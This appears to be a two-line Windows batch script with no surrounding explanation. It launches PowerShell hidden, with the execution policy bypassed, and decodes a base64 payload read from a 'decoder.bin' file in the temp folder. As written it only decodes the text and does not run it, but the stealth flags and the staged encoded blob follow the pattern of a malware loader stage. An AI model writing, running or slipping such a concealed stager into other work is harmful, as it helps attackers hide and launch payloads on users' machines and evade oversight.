@echo off
powershell.exe -noprofile -executionpolicy bypass -windowstyle hidden -command "& {[system.text.encoding]::unicode.getstring([convert]::frombase64string((get-content -path '$env:temp/decoder.bin' -raw)))}"